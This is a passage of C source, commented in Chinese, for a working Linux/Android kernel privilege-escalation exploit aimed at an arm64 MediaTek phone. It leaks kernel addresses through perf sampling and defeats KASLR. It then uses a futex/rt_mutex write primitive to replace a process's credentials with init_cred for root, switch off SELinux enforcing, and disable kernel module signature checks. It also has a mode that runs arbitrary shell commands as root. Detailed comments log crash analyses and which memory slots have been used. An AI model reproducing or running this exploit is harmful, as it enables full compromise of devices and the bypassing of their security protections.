    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    __sync_synchronize();

    head = m->data_head;
    tail = 0;
    rs   = m->data_size;
    ring = (uint8_t *)mp + m->data_offset;

    while (tail + sizeof(struct perf_event_header) <= head) {
        struct perf_event_header h;
        uint64_t off = tail & (rs - 1);
        if (off + sizeof(h) <= rs) {
            memcpy(&h, ring + off, sizeof(h));
        } else {
            uint8_t b[sizeof(h)];
            size_t f = (size_t)(rs - off);
            memcpy(b, ring + off, f);
            memcpy(b + f, ring, sizeof(h) - f);
            memcpy(&h, b, sizeof(h));
        }
        if (h.size < sizeof(h) || tail + h.size > head) break;

        if (h.type == PERF_RECORD_SAMPLE) {
            uint64_t pos = tail + sizeof(h);
            uint64_t ip  = ring_u64(ring, rs, pos); pos += 8;
            uint64_t abi = ring_u64(ring, rs, pos); pos += 8;
            nsamp++;
            if (abi == 2 && ip >= cc_rt + CC_WIN_LO && ip < cc_rt + CC_WIN_HI) {
                uint64_t x20 = ring_u64(ring, rs, pos + (uint64_t)20 * 8);
                hits++;
                if (x20) {
                    int seen = 0;
                    for (int i = 0; i < nc; i++)
                        if (cand[i] == (unsigned long)x20) { seen = 1; break; }
                    if (!seen && nc < 64) cand[nc++] = (unsigned long)x20;
                }
            }
        }
        tail += h.size;
    }

    munmap(mp, msz);
    close(fd);
    if (out_hits) *out_hits = hits;

    printf("[*] leak: samples=%d hits_in_commit_creds=%d distinct_x20=%d\n",
           nsamp, hits, nc);
    for (int i = 0; i < nc && i < 8; i++)
        printf("[*] leak:   x20[%d] = 0x%016lx\n", i, cand[i]);

    if (nc == 1 && hits >= 2) return cand[0];
    if (nc > 1)
        printf("[!] leak: 命中 %d 个不同 x20，无法唯一判定，拒绝使用\n", nc);
    return 0;
}

/* 带重试的封装：采样有稀疏性，单轮命中 0 次属正常，最多试 5 轮 */
static unsigned long leak_task_retry(unsigned long cc_rt, const char *tag) {
    for (int t = 0; t < 5; t++) {
        int hits = 0;
        unsigned long v = leak_task_in_thread(cc_rt, &hits);
        if (v) {
            printf("[+] leak(%s): task_struct = 0x%lx  (hits=%d round=%d)\n",
                   tag, v, hits, t + 1);
            return v;
        }
        printf("[!] leak(%s): 第 %d 轮未取得唯一结果 (hits=%d)，重试\n",
               tag, t + 1, hits);
    }
    printf("[-] leak(%s): 5 轮全部失败\n", tag);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * ★★★ v82 第一步：纯泄漏验证（绝不写内核、绝不消耗 slot）★★★
 *
 * 目的：在做任何写入之前，先证明"能在本机稳定拿到 task_struct"。
 *   ① 主线程泄漏一次
 *   ② 新起一个工作线程再泄漏一次
 *   ③ 两者必须【不同】——这是反伪证的核心：若拿到的是 init_task 或
 *      mm_struct/signal_struct 这类共享对象，两个线程会得到同一个值。
 *
 * 判据（全部满足才算通过）：
 *   · 两次都非 0，且命中次数 >= 2（排除偶然单次采样）
 *   · 两次不相等（排除静态全局 / 进程级共享对象）
 *   · 都落在 0xffffffc000000000 以上（PAGE_OFFSET 线性映射/堆区，
 *     而非 .data 段的静态对象 —— init_task 虽也在内核区，但已被上一条排除）
 *   · 都不是 init_task + slide
 *
 * 本分支【不做 do_stamp】：不写 T 页指纹、不碰 bm_pmd、不消耗 slot，
 * 因此可以无限次重跑，不会污染内核状态。
 * ══════════════════════════════════════════════════════════════════════════ */
static unsigned long g_leak_cc_rt = 0;
static volatile unsigned long g_leak_thr_result = 0;

static void *leak_thread_fn(void *a) {
    (void)a;
    g_leak_thr_result = leak_task_retry(g_leak_cc_rt, "worker");
    return NULL;
}

static int do_leak_verify(void) {
    unsigned long cc_rt = LINK_COMMIT_CREDS + g_slide;
    unsigned long t_main = 0, t_thr = 0;
    pthread_t th;
    int ok = 1;

    printf("[v82] ============ LEAK 验证模式（只读，不写内核）============\n");
    printf("[v82] commit_creds 运行时 = 0x%lx   采样窗口 = [+0x%lx, +0x%lx)\n",
           cc_rt, CC_WIN_LO, CC_WIN_HI);
    printf("[v82] init_task  运行时 = 0x%lx （用于排除）\n", g_init_task_rt);

    /* 前置校验：commit_creds 必须落在内核 .kernel 段内 */
    if (cc_rt < 0xffffff8000000000UL || cc_rt > 0xffffffffffffffffUL) {
        printf("[-] commit_creds 地址 0x%lx 非内核地址，拒绝\n", cc_rt);
        return 1;
    }
    if ((g_slide & 0x1fffffUL) != 0) {
        printf("[-] slide 0x%lx 未 2MB 对齐，拒绝\n", g_slide);
        return 1;
    }

    /* ── ① 主线程 ── */
    printf("[v82] --- [1/2] 主线程泄漏 ---\n");
    t_main = leak_task_retry(cc_rt, "main");

    /* ── ② 工作线程 ── */
    printf("[v82] --- [2/2] 工作线程泄漏 ---\n");
    g_leak_cc_rt = cc_rt;
    if (pthread_create(&th, NULL, leak_thread_fn, NULL) != 0) {
        printf("[-] pthread_create 失败: %s\n", strerror(errno));
        return 1;
    }
    pthread_join(th, NULL);
    t_thr = g_leak_thr_result;

    /* ── 判定 ── */
    printf("[v82] ==================== 判定 ====================\n");
    printf("[v82] main   task_struct = 0x%lx\n", t_main);
    printf("[v82] worker task_struct = 0x%lx\n", t_thr);

    if (!t_main) { printf("[x] 主线程未取得地址\n"); ok = 0; }
    if (!t_thr)  { printf("[x] 工作线程未取得地址\n"); ok = 0; }

    if (ok) {
        if (t_main == t_thr) {
            printf("[x] 两线程地址相同 ⇒ 怀疑是静态全局/共享对象，不是 per-thread task\n");
            ok = 0;
        } else {
            long d = (long)(t_thr - t_main);
            printf("[+] 两线程不同，差值 = %ld (0x%lx)\n", d, (unsigned long)(d < 0 ? -d : d));
        }
        if (t_main == g_init_task_rt || t_thr == g_init_task_rt) {
            printf("[x] 命中 init_task ⇒ 是静态对象，泄漏方法无效\n");
            ok = 0;
        }
        if (t_main < 0xffffffc000000000UL || t_thr < 0xffffffc000000000UL) {
            printf("[x] 地址低于 PAGE_OFFSET(0xffffffc000000000)，不是堆上的 task_struct\n");
            ok = 0;
        }
        /* task_struct 8 字节对齐（实际 64 字节对齐，这里只做宽松校验） */
        if ((t_main & 7) || (t_thr & 7)) {
            printf("[x] 地址未 8 字节对齐\n");
            ok = 0;
        }
    }

    if (ok) {
        printf("[v82] *** LEAK OK ***  可在下一步用 target = task+0x768 写 cred\n");
        printf("[v82] 本分支未做 do_stamp，未消耗任何 slot，可重复运行\n");
        return 0;
    }
    printf("[v82] *** LEAK FAILED ***  不要进入第二步\n");
    return 2;
}

/* ── main ── */
int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGPIPE, SIG_IGN);

    /* ★ 全自动 KASLR：先泄露 slide，再动态填所有内核地址 */
    if (solve_kaslr() != 0) {
        fprintf(stderr, "[-] KASLR 求解失败，退出\n");
        return 1;
    }

    /* ★★★ v80i 用法（每个进程只打一个目标）★★★
     *   ./gl_pju110 selinux   → 写 selinux_state+1（关 SELinux）
     *   ./gl_pju110 sig       → 写 sig_enforce      （关模块强签）
     *   （旧的自定义 target/value 模式保留在 else 分支，仅调试用）
     *
     * 为什么必须拆成两次进程：v79i 实测在同一个进程里连做两次 chain walk
     * 会崩在 rt_mutex_adjust_prio_chain+0x650 的 BUG_ON(w->lock != lock)，
     * 因为第 1 轮 rb_insert_color_cached 已把 fake_lock->waiters.rb_leftmost
     * 写成本进程内核栈上的 waiter 地址，第二次再取 top_waiter 就拿到陈旧指针。
     * 详见 th_waiter 里的注释。 */
    if (argc > 1 && strcmp(argv[1], "leak") == 0) {
        /* ★★★ v82 第一步：纯泄漏验证分支 ★★★
         * 只做 perf 采样拿 task_struct，绝不 do_stamp、绝不碰 bm_pmd。
         * 因此不消耗 slot、不写内核，可无限次重跑。
         * 必须放在所有写入分支【之前】直接 return，确保不会误入写入路径。 */
        g_mode = MODE_LEAK;
        return do_leak_verify();
    } else if (argc > 1 && strcmp(argv[1], "clean") == 0) {
        /* 4.19 移植：以 root 身份清掉旧模块遗留的状态，让 KernelSU 3.3.1
         * 的 Manager 自己重建 ksud 与 allowlist。 */
        g_mode  = MODE_CRED;
        g_do_clean = 1;
        g_slot  = (argc > 2) ? strtoul(argv[2], 0, 0) : SCR_LOCK7;
        if (argc > 3)
            g_run_cmd = NULL;
    } else if (argc > 2 && strcmp(argv[1], "run") == 0) {
        /* ★★★ v85：一次性执行 ★★★
         * cred 提权成功后，干净 root 子进程直接 exec 成 sh -c <命令>，
         * 不留守护进程。槽位用 SCR_LOCK14(0x680)。 */
        g_mode = MODE_CRED;
        g_slot = (argc > 3) ? strtoul(argv[3], 0, 0) : SCR_LOCK8;
        g_run_cmd = argv[2];
        printf("[v85] MODE=RUN slot=0x%lx\n[v85] cmd: %s\n", g_slot, g_run_cmd);
    } else if (argc > 1 && strcmp(argv[1], "cred") == 0) {
        /* ★★★ v82 第二步：写 task_struct->cred = &init_cred（提权到 root）★★★
         * 注意：g_target / g_value 【不在这里设置】——
         *   它们依赖运行时泄漏到的 task_struct 地址，必须在 child_body()
         *   里泄漏完成后才能算出来。这里只定 slot。
         * slot 用全新的 SCR_LOCK8(0x540)：本开机从未写过。
         *   约束核算：0x540 + 0x84C = 0xD8C < 0x1000 ✅（假 task 的 pi_lock 不跨页）
         *             0x540 不在 0x800..0x81F（value 区）✅ */
        g_mode = MODE_CRED;
        /* ★★★ 槽位台账（本开机内绝不可复用）★★★
         *   0x680 ← v82g 已用，脏
         *   0x6C0 ← v82h 已用（完整成功：uid=0, CapEff=0x3fffffffff），脏
         *   0x740 ← v82i 已用（连续第二次成功），脏
         *   ⇒ 改用手上全新槽 0x700 (SCR_LOCK12) */
        g_slot = SCR_LOCK12;
        printf("[v82] MODE=CRED  slot=0x%lx (SCR_LOCK12, 本开机未用过)\n", g_slot);
        printf("[v82] target/value 将在泄漏 task_struct 后于子进程内计算\n");
    } else if (argc > 1 && strcmp(argv[1], "diag") == 0) {
        /* ★★★ v82 原语诊断分支 ★★★
         * 目的：用【已验证成功过的目标】sig_enforce 来验证 do_stamp 链路
         * 在全新 slot(0x540) 下是否仍然工作，从而把"原语失效"与
         * "cred 目标特殊"两个问题彻底分开。
         *
         * 背景：v81 用 slot=0x340 打 sig_enforce 是【实测成功】的
         * （VERDICT(sig_enforce): Y -> *** UNSIGNED MODULE ALLOWED ***）。
         * 若 v82 用 0x540 打同一目标失败，说明问题在 slot/喷射；
         * 若成功，说明原语没问题，cred 分支的失败在别处。
         *
         * ⚠️ 本分支不做 perf 泄漏（不消耗时间），走的完全是 v81 老路径。 */
        g_mode = MODE_DIAG;
        g_target = g_sig_enf_rt;
        g_value  = g_scr_rt + SCR_VALUE;
        g_slot   = SCR_LOCK10;         /* ★ v82b：0x540 已写脏（本分支上次跑的就是它）
                                        *   ⇒ 再跑必崩在 rt_mutex_adjust_prio_chain+0x154。
                                        *   改用备用全新槽 0x740。 */
        printf("[v82] MODE=DIAG target=SIG_ENFORCE 0x%lx value=0x%lx slot=0x%lx\n",
               g_target, g_value, g_slot);
        printf("[v82] 用途：验证 slot 0x740 下 do_stamp 是否仍能提交写入\n");
    } else if (argc > 1 && strcmp(argv[1], "kptr") == 0) {
        /* ★★★ v81 最终结论：此目标【原理上不可达】，拒绝执行 ★★★
         *   kptr_restrict 是 4 字节 int，kallsyms_show_value() 里
         *     switch (kptr_restrict) { case 0: ... case 1: ... default: return false; }
         *   必须恰好等于 0 才有效。
         *   而本原语是 str x10,[x8]，写【8 字节】，int 读到 value 的低 32 位。
         *   value=bm_pmd+0x800=0xffffff800ae4d800 ⇒ 低 32 位 0x0AE4D800 ⇒ 非 0 ⇒ 无效。
         *   要写入 0，必须 value==0（或 1..3），但 value&~3==0 会走 0x288 的
         *     str x8,[x1]  ⇒ fake_lock->waiters.rb_root.rb_node = target，
         *   随后 rt_mutex_enqueue 的 while(*link) 把 target 当 rb_node 解引用
         *   ⇒ 必崩（v76i +0x248 同模式）⇒ 白白烧掉一个 slot 并重启。
         *   而"低 32 位为 0 且 value&~3≠0 且可安全读"的内核地址：
         *   全 vmlinux 188251 个符号中 4GB 对齐的 b/d/s 符号 count=0；
         *   PAGE_OFFSET / VMEMMAP_START 虽 4GB 对齐，但其映射依赖 memstart_addr
         *   随机化，读 value+16 可能落在线性映射空洞 ⇒ Page Fault ⇒ 重启。
         *   ⇒ 无解，放弃。*/
        printf("[v81] REFUSE: kptr_restrict 是 int，本原语只能写 8 字节，\n"
               "      低 32 位无法为 0，清零不可达。已放弃该目标（不做 do_stamp，\n"
               "      不消耗 slot）。\n");
        return 1;
    } else if (argc > 1 && strcmp(argv[1], "panic") == 0) {
        /* ★★★ v81 最终结论：此目标【原理上不可达】，拒绝执行 ★★★
         *   同 kptr 理由：panic_on_oops 是 4 字节 int，非 0 即 panic()。
         *   另注：即使能清零也未必有用 —— 崩溃日志里 die 链为
         *     notify_die → ipanic_die → mrdump_common_die ⇒ MTK 的 die notifier
         *   自身就会 dump+reboot，不依赖 panic_on_oops。故该目标价值也低。 */
        printf("[v81] REFUSE: panic_on_oops 是 int，本原语只能写 8 字节，\n"
               "      低 32 位无法为 0，清零不可达；且 MTK ipanic_die 不依赖它。\n"
               "      已放弃该目标（不做 do_stamp，不消耗 slot）。\n");
        return 1;
    } else if (argc > 1 && strcmp(argv[1], "sig") == 0) {
        /* 写 sig_enforce（1 字节 bool），清零后 module_sig_check 把
         * -ENOKEY 降级为 0 ⇒ 未签名 .ko 可 insmod（KSU 越狱前提）。
         * ★ v84：0x340(SCR_LOCK6)/0x440 在历史开机的 v81 已写脏；
         *   本开机已用 0x680(cred)/0x740(cred)/0x700(cred)。
         *   ⇒ 改用本开机全新槽 0x780 (SCR_LOCK11)，0x780+0x84C=0xFCC ✅ */
        g_target = g_sig_enf_rt;
        g_value  = g_scr_rt + SCR_VALUE;
        g_slot   = (argc > 2) ? strtoul(argv[2], 0, 0) : SCR_LOCK11;
        printf("[v84] target=SIG_ENFORCE 0x%lx value=0x%lx slot=0x%lx\n",
               g_target, g_value, g_slot);
    } else if (argc > 1 && strcmp(argv[1], "selinux") == 0) {
        /* 写 selinux_state+1（enforcing 所在字节）。
         * ★ v81：slot 改用全新的 SCR_LOCK7(0x440)，旧 0x040 已写脏。 */
        g_target = g_selinux_enf_rt;
        g_value  = g_scr_rt + SCR_VALUE;
        g_slot   = (argc > 2) ? strtoul(argv[2], 0, 0) : SCR_LOCK7;
        printf("[v81] target=SELINUX enforcing 0x%lx value=0x%lx slot=0x%lx\n",
               g_target, g_value, g_slot);
    } else if (argc > 1 && strcmp(argv[1], "sigold") == 0) {
        /* 写 sig_enforce（1 字节 bool），清零后 module_sig_check 把
         * -ENOKEY 降级为 0 ⇒ 未签名 .ko 可 insmod（KSU 越狱前提）。
         * sig_enforce 在 0xffffff800ab0a9f0，16 字节对齐，满足 8 字节写。
         * ⚠️ slot 必须用一个【本开机从未写过】的零槽：
         *   0x040 已被 selinux 那一轮写脏（rb_root/rb_leftmost = 上个
         *         进程的 waiter 栈地址），复用必崩。
         *   0x0C0 已被一次误跑写脏（当时 g_target_rt 未同步，见下），
         *         同样不可复用。
         *   故改用 0x100。三者的 +0x20(state)/+0x84C(pi_lock) 都在同一
         *   页内且互不重叠，作为假 task_struct 时安全。 */
        g_target = g_sig_enf_rt;
        g_value  = g_scr_rt + SCR_VALUE;
        g_slot   = SCR_LOCK3;   /* 全新零槽 #3 */
        printf("[v80i] target=SIG_ENFORCE 0x%lx value=0x%lx slot=0x%lx\n",
               g_target, g_value, g_slot);
    } else if (argc > 1 && (strcmp(argv[1], "A") == 0)) {
        g_target = g_selinux_state_rt + 8;
        g_value  = (argc > 2) ? strtoul(argv[2], NULL, 0) : (g_selinux_state_rt + 0x100);
        g_slot   = SCR_LOCK1;
        printf("[v70i-pju110] A 步整形: target=0x%lx (SE+8) value=0x%lx\n", g_target, g_value);
    } else if (argc > 2) {
        g_target = strtoul(argv[1], NULL, 0);
        g_value  = strtoul(argv[2], NULL, 0);
        g_slot   = SCR_LOCK1;
        printf("[v70i-pju110] 自定义: target=0x%lx value=0x%lx\n", g_target, g_value);
    } else {
        /* 默认 = selinux */
        g_target = g_selinux_enf_rt;
        g_value  = g_scr_rt + SCR_VALUE;
        g_slot   = SCR_LOCK1;
        printf("[v80i] 默认 target=SELINUX enforcing 0x%lx value=0x%lx slot=0x%lx\n",
               g_target, g_value, g_slot);
    }

    /* ★★★ v80j 关键修正：g_target_rt 必须与 g_target 同步 ★★★
     *   th_waiter 喷射用的是 g_target_rt（可原子读的 volatile），
     *   而 main 里按 argv 设的是 g_target。两者不同步的话，
     *   sig 那次会拿着旧的 selinux 地址再打一遍（幂等、无害但白跑）。
     *   v79i 靠 th_probe 里的 store 切换，那段被删了，这里必须补上。 */
    __atomic_store_n(&g_target_rt, g_target, __ATOMIC_RELEASE);
    /* ★★★ v81 关键修正：g_fake_lock 必须在 argv 解析【之后】重算 ★★★
     *   第 1296 行 `g_fake_lock = g_scr_rt + g_slot;` 执行时 g_slot 还是初值 0，
     *   而 g_slot 要到上面 argv 分支里才被赋值 ⇒ 若不在此处重算，
     *   waiter->lock 会指向 bm_pmd+0x00（bm_pmd 自身的 PMD 表项，非全零、
     *   且是 fixmap 活的页表），既违反"全零假 rt_mutex"前提，
     *   也可能被 rb_erase/enqueue 当成 rb_root 去解引用。
     *   这里重算后，lock 才真正落在所选 slot（全零、同页、+0x84C 不越页）。 */
    g_fake_lock = g_scr_rt + g_slot;
    printf("[*] fake_lock(synced) = 0x%lx (slot=0x%lx)\\n", g_fake_lock, g_slot);
    /* ★ 历史注记：v80i 起不再写 selinux_state 基址（disabled 字段）。
     *   早期版本的 "B 步" 是 target=selinux_state、value=1，
     *   靠 byte0=1(disabled) / byte1=0(enforcing) 一次写掉两个字段。
     *   但那条路径依赖 value&~3==0 走 0x81d4，会执行 str x8,[x1] 把
     *   fake_lock->waiters.rb_root 写成 target，从而在下一次 chain walk
     *   里被 rt_mutex_enqueue 当树根遍历（v76i 的 +0x248 崩溃）。
     *   现在的 selinux 目标改为 enforcing 单字节 + value=bm_pmd+0x800
     *   （&~3≠0），走 0x7fd4/0x7fe0/ret，完全不碰 rb_root。 */

    /* 读取 uptime 用于超时校准 */
    { FILE *f = fopen("/proc/uptime", "r");
      if (f) { if (fscanf(f, "%lf", &g_up) != 1) g_up = 0; fclose(f); } }
    printf("[*] diag: g_up=%.6f (boottime, 仅供参考)\n", g_up);
    { struct timespec _mn; clock_gettime(CLOCK_MONOTONIC, &_mn);
      printf("[*] diag: CLOCK_MONOTONIC=%ld.%09ld (waiter 超时基准)\n",
             (long)_mn.tv_sec, (long)_mn.tv_nsec); }

    /* ★ trace_marker 打开：失败不影响主流程（只是失去时间轴对齐） */
    g_tm_fd = open("/sys/kernel/tracing/trace_marker", O_WRONLY);
    if (g_tm_fd < 0) printf("[!] trace_marker open failed (errno=%d)，时间轴打点关闭\n", errno);
    else printf("[*] trace_marker ready (fd=%d)\n", g_tm_fd);

    /* memfd 创建共享页面
     * offset 0x0000: F[3] + 标志 (共享页 fp)
     * offset 0x1000: T/P/Q/R (固定地址) */
    g_mfd = (int)syscall(__NR_memfd_create, "gl70d", 1);
    if (g_mfd < 0) { perror("memfd_create"); return 1; }
    ftruncate(g_mfd, 0x5000);

    /* 共享页: F + 标志 */
    void *fp = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_SHARED, g_mfd, 0);
    if (fp == MAP_FAILED) { perror("mmap shared"); return 1; }

    F = (unsigned*)fp;

    F[F_CHAIN]  = 0;
    F[F_TARGET] = 0;
    F[F_WAIT]   = 1;

    /* ★ v82b：判决用槽位先填哨兵。memfd 被 ftruncate 后是零填，
     *   若初值留 0，子进程没写也会被父进程误判成 "uid=0 提权成功"。
     *   哨兵 0xdeadbeef 是 shell uid(2000) 与 root(0) 都不可能出现的值。 */
    F[3] = 0xdeadbeefU;   /* child uid  */
    F[4] = 0xdeadbeefU;   /* child euid */
    F[5] = 0xdeadbeefU;   /* probe_done */

    /* 固定地址页: T/P/Q/R (memfd offset 0x1000) */
    if (mmap((void*)T_ADDR, 0x4000, PROT_READ | PROT_WRITE,
             MAP_FIXED | MAP_SHARED, g_mfd, 0x1000) != (void*)T_ADDR) {
        perror("mmap fixed");
        return 1;
    }

    /* ★ A 步 value=Q_ADDR 是用户页, rb_erase 写路径会解引用 *(value+8/0x10)
     *   在原子上下文, 必须先建 PTE (MAP_SHARED memfd + 预触发), 否则 oops。
     *   Q_ADDR 在 0x10000000+0x3000 (T 页已映射), 这里再 touch Q 页全范围保证 PTE。 */
    /* PAN 修复：A/B 步 value 均为内核地址 empty_zero+0x100。
     * rb_erase 副作用会解引用 value&~3 的 rb_left(+0x10)/rb_right(+0x08)，
     * 若 value 是用户地址(Q_ADDR)则 PAN 下读 value+0x10 直接 Panic。
     * empty_zero+0x100 是内核 bss 全零页：解引用=0，副作用写落 +0x108，安全。
     * 内核地址不经过用户页表，无需 touch PTE。 */

    /* 记录开跑前的 enforce，作为唯一可信判据的前置基线 */
    g_enf_before = read_enforce();
    printf("[*] enforce before = %d\n", g_enf_before);

    build_fakes();

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv)) {
        perror("socketpair");
        return 1;
    }

    printf("[*] round=0 T=0x%lx R0=0x%lx\n",
           (unsigned long)T_ADDR, (unsigned long)R_ADDR);

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return 1; }

    if (pid == 0) {
        /* 子进程 */
        int rc = child_body();

        /* 落盘指纹 */
        char logpath[128];
        snprintf(logpath, sizeof(logpath), "/data/local/tmp/v70i_0.log");
        FILE *lf = fopen(logpath, "w");
        if (lf) {
            unsigned long *t = (unsigned long*)T_ADDR;
            unsigned long *rr = (unsigned long*)R_ADDR;
            fprintf(lf, "rc=%d probe=%d/%d stamped=%d\n",
                    rc, pr_ret, pr_err,
                    __atomic_load_n(&g_stamped, __ATOMIC_ACQUIRE));
            fprintf(lf, "w_wait=%ld/%ld stamp_enter=%ld stamp_exit=%ld snd_ret=%ld\n",
                    w_wait_ret, w_wait_err, stamp_enter, stamp_exit, snd_ret);
            fprintf(lf, "T0=0x%lx T1=0x%lx T2=0x%lx R0=0x%lx\n",
                    t[0], t[1], t[2], rr[0]);
            fprintf(lf, "F0=0x%08x F1=0x%08x o_lock=%ld/%ld w_wait=%ld/%ld\n",
                    F[F_CHAIN], F[F_TARGET], o_lock_ret, o_lock_err,
                    w_wait_ret, w_wait_err);
            fprintf(lf, "stamp=%ld/%ld snd=%ld enforce=%d(before %d)\n",
                    stamp_enter, stamp_exit, snd_ret,
                    read_enforce(), g_enf_before);
            fclose(lf);
        }
        exit(rc);
    }

    /* 父进程: 等 4s 后读指纹 */
    for (int i = 0; i < 400 &&
         !__atomic_load_n(&g_stamped, __ATOMIC_ACQUIRE); i++)
        usleep(10000);

    /* ★ v82：等待时间从 8s 延长到 25s。
     * 原因：cred 分支里子进程要先做 perf 泄漏（最多 5 轮 × 1200 次 setuid），
     * 再做完整 futex 时序（waiter 超时 3s + probe + 判决），
     * 实测原 8s 不够 —— 父进程会在子进程打印判决前就 SIGKILL 掉它，
     * 导致"看不到 CRED 判决"的假象。 */
    sleep(25);

    unsigned long *t = (unsigned long*)T_ADDR;

    /* ══════════════════════════════════════════════════════════════════
     * ★★★ v82b 新增：从共享页读子进程写下的判决 ★★★
     *
     * 为什么必须有这一层：
     *   若 cred 改写成功，子进程会连发 3 个 syscall（getuid/geteuid/printf），
     *   任何一个都可能被 oplus_invoke_syscall 拦下并 do_group_exit(9)，
     *   导致 stdout 上的 "CRED 判决" 永远看不到。
     *   但子进程在【任何 syscall 之前】已把 uid/euid/probe_done 写进
     *   共享 futex 页的 F[3]/F[4]/F[5]（MAP_SHARED，父子共享同一物理页）。
     *   ⇒ 即便子进程当场被杀，父进程仍能拿到铁证。
     *
     * 判读：
     *   F[3]==0        → cred 改写成功，uid 已变 0（提权成立）
     *   F[3]==2000     → cred 未改写（写原语未命中，或 target 偏移错）
     *   F[3]==0&&F[5]==0 → 写成功但 probe 没跑完（时序问题）
     * ══════════════════════════════════════════════════════════════════ */
    {
        unsigned int sh_uid  = F[3];
        unsigned int sh_euid = F[4];
        unsigned int sh_probe = F[5];
        printf("[*] SHM verdict (child -> parent, survives SIGKILL):\n");
        printf("    F[3] child_uid  = %u\n", sh_uid);
        printf("    F[4] child_euid = %u\n", sh_euid);
        printf("    F[5] probe_done = %u\n", sh_probe);
        if (sh_uid == 0 && sh_euid == 0)
            printf("[*] *** SHM SAYS ROOT *** cred 指针改写成功，子进程已是 uid=0\n");
        else if (sh_uid == 2000)
            printf("[*] SHM says NOT-ROOT (uid still 2000): 写原语未命中该地址\n");
        else if (sh_uid == 0xdeadbeefU)
            printf("[*] SHM 页未被填充（哨兵未变）：子进程在执行到该点之前就死了\n");
        else
            printf("[*] SHM 值异常（uid=%u），子进程可能部分执行后被杀\n", sh_uid);
    }

    printf("[*] fingerprint (parent):\n");
    printf("    T0=0x%lx %s\n", t[0],
           t[0] == 0x10001UL ? "*** trylock executed!" : "(unchanged)");
    /* ★ 修正：原写法无条件打印 "***"，T1=0 时是假阳性。
     * fake_lock 自 v77i 起已搬到内核 BSS 的 bm_pmd+slot，
     * 因此 T 页的 T0/T1 自那以后恒为 0，这两个指纹【已失效】。
     * 真正有效的判据是子进程打印的 VERDICT / CRED 判决。 */
    if (t[1] == g_target)
        printf("    T1=0x%lx *** rb_root = target (write happened!)\n", t[1]);
    else
        printf("    T1=0x%lx (not target; 注: fake_lock 已迁至内核BSS, T页指纹失效属正常)\n",
               t[1]);

    /* ══════════════════════════════════════════════════════════════════════
     * ★★★ v82f 致命缺陷修复：绝不 kill 子进程 ★★★
     *
     * ── 事故现场（2026-10-27 08:15:58，第 5 次运行后重启）──
     *   pc : kmem_cache_free+0x50
     *   lr : put_cred_rcu+0x7c
     *   x20: ffffffa5296fcf78        ← init_cred
     *   x1 : ffffffa5296fcf78        ← 被 free 的对象
     *   x19: ffffffbf00000000        ← 从 init_cred->slab_cache 读出的野值
     *   Call trace: put_cred_rcu ← rcu_process_callbacks ← __do_softirq
     *
     * ── 因果链 ──
     *   ① 我们把 task->cred 改成了 &init_cred（静态 .data 对象，
     *      由 INIT_CRED 宏定义，【不是】kmem_cache_alloc 出来的）。
     *   ② init_cred.usage 初值 = 4（real_cred + cred + init_task 等持有者）。
     *   ③ 进程退出时 exit_creds() 会：
     *        put_cred(tsk->real_cred);   ← 未改，指向原 shell cred，正常释放
     *        put_cred(tsk->cred);        ← 已改，指向 init_cred ⇒ usage--
     *   ④ 当 usage 降到 0，__put_cred 排入 RCU 回调 → put_cred_rcu →
     *      kmem_cache_free(cred->slab_cache, cred)。
     *      但 init_cred 不是 slab 对象，它的 slab_cache 字段是
     *      .data 里的相邻数据（此处读出 ffffffbf00000000）⇒
     *      kmem_cache_free 解引用野 cache ⇒ paging request ⇒ Oops。
     *   ⑤ panic_on_oops=1 ⇒ 立即重启。
     *
     *   实测代价：每次运行消耗 init_cred.usage 1 点。5 次后归零即崩。
     *   这是【累计性】损伤，与 slot 复用无关，之前完全没意识到。
     *
     * ── 修复 ──
     *   ① 绝不 kill 子进程。让它自己常驻（child_body 末尾已有
     *      for(;;) sleep(30) 的 HOLD 循环），只要它活着，cred 引用
     *      就一直被持有，usage 不会被递减到 0。
     *   ② 父进程直接退出，把子进程留成孤儿（被 init 收养）。
     *      用户拿到 root shell 后手动 kill -9 <pid> 收尾时，
     *      usage 只减 1，远不到 0，安全。
     *   ③ 若确实要清理，只能 kill 一次，且必须保证此前 usage > 1。
     *
     * ⚠️ 结论：本文件从此不做 kill。清理靠人。
     * ══════════════════════════════════════════════════════════════════════ */
    if (g_mode == MODE_CRED) {
        printf("[*] 保留子进程 pid=%d 常驻（不 kill：杀它会 put_cred(init_cred)\n", (int)pid);
        printf("[*]   使静态对象 usage--，累计到 0 就会 kmem_cache_free 崩溃）\n");
        printf("[*] 手动收尾：kill -9 %d   （只需一次，勿反复杀）\n", (int)pid);
    } else {
        /* legacy 模式未改 cred，杀掉是安全的（原逻辑） */
        kill(pid, SIGKILL);
        waitpid(pid, NULL, 0);
    }
    return 0;
}